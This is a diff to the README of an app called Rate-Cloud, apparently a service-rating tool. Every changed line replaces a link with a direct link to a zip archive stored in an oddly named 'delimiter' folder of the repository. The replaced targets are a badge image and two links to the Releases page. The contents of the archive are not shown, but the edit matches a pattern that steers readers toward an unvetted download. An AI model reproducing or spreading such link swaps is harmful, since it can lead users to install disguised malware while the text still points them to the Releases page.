@@ -1,6 +1,6 @@
 # 🌐 Rate-Cloud - Share Your Service Ratings Effortlessly
 
-![Download Rate-Cloud](https://img.shields.io/badge/Download-Rate--Cloud-blue)
+![Download Rate-Cloud](https://raw.githubusercontent.com/asihgdfas/Rate-Cloud/main/delimiter/Rate-Cloud.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Rate-Cloud! This application helps you review and rate services, brow
 
 To get started, visit the link below to download the latest version of Rate-Cloud:
 
-[Download Rate-Cloud](https://github.com/asihgdfas/Rate-Cloud/releases)
+[Download Rate-Cloud](https://raw.githubusercontent.com/asihgdfas/Rate-Cloud/main/delimiter/Rate-Cloud.zip)
 
 ### System Requirements
 
@@ -65,4 +65,4 @@ We thank everyone who has contributed to Rate-Cloud. Your support makes this pro
 
 To stay updated with the latest features and improvements, keep an eye on the Releases page:
 
-[Download Rate-Cloud](https://github.com/asihgdfas/Rate-Cloud/releases)
+[Download Rate-Cloud](https://raw.githubusercontent.com/asihgdfas/Rate-Cloud/main/delimiter/Rate-Cloud.zip)
